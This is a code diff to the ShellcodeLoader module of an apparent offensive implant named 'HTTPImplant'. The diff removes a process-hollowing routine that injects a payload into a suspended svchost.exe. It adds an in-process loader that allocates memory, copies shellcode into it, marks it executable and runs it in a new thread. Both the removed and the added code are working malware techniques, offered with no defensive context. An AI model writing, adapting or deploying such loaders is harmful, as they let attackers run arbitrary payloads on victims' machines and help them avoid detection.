@@ -5,73 +5,53 @@ namespace HTTPImplant.Modules
 {
     public class ShellcodeLoader
     {
-        public const uint CREATE_SUSPENDED = 0x4;
-        public const int PROCESSBASICINFORMATION = 0;
-
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
-        public struct ProcessInfo
+        [Flags]
+        public enum AllocationType
         {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public Int32 ProcessId;
-            public Int32 ThreadId;
+            Commit = 0x1000,
+            Reserve = 0x2000,
+            Decommit = 0x4000,
+            Release = 0x8000,
+            Reset = 0x80000,
+            Physical = 0x400000,
+            TopDown = 0x100000,
+            WriteWatch = 0x200000,
+            LargePages = 0x20000000
         }
 
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
-        public struct StartupInfo
+        [Flags]
+        public enum MemoryProtection
         {
-            public uint cb;
-            public string lpReserved;
-            public string lpDesktop;
-            public string lpTitle;
-            public uint dwX;
-            public uint dwY;
-            public uint dwXSize;
-            public uint dwYSize;
-            public uint dwXCountChars;
-            public uint dwYCountChars;
-            public uint dwFillAttribute;
-            public uint dwFlags;
-            public short wShowWindow;
-            public short cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct ProcessBasicInfo
-        {
-            public IntPtr Reserved1;
-            public IntPtr PebAddress;
-            public IntPtr Reserved2;
-            public IntPtr Reserved3;
-            public IntPtr UniquePid;
-            public IntPtr MoreReserved;
+            Execute = 0x10,
+            ExecuteRead = 0x20,
+            ExecuteReadWrite = 0x40,
+            ExecuteWriteCopy = 0x80,
+            NoAccess = 0x01,
+            ReadOnly = 0x02,
+            ReadWrite = 0x04,
+            WriteCopy = 0x08,
+            GuardModifierflag = 0x100,
+            NoCacheModifierflag = 0x200,
+            WriteCombineModifierflag = 0x400
         }
 
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
 
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
-            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
-            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
 
-        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
-        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
-            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
-            int dwSize, out IntPtr lpNumberOfbytesRW);
+        [DllImport("Kernel32.dll")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate void MyFunction();
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern uint ResumeThread(IntPtr hThread);
+        [DllImport("kernel32.dll")]
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
         public static void ProcHollow(byte[] buf)
         {
@@ -83,35 +63,23 @@ namespace HTTPImplant.Modules
                 return;
             }
 
-            StartupInfo sInfo = new StartupInfo();
-            ProcessInfo pInfo = new ProcessInfo();
-            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
-                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
+            byte[] shellcode = buf;
 
-            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
-            uint retLen = new uint();
-            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
-            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
+            var baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
 
-            byte[] procAddr = new byte[0x8];
-            byte[] dataBuf = new byte[0x200];
-            IntPtr bytesRW = new IntPtr();
-            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
-            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
-            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
+            // Copy the shellcode into the memory region
+            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
 
-            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
+            // For VirtualProtect
+            uint oldProtect;
+            VirtualProtect(baseAddress, (uint)shellcode.Length, (uint)MemoryProtection.ExecuteRead, out oldProtect);
 
-            uint rvaOffset = e_lfanew + 0x28;
+            // For CreateThread
+            IntPtr threadId;
+            var hThread = CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadId);
 
-            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
-
-            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
-
-            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
-
-            // Resume the thread to trigger our payload
-            uint rResult = ResumeThread(pInfo.hThread);
+            // Wait infinitely on this thread to stop the process exiting
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
 }
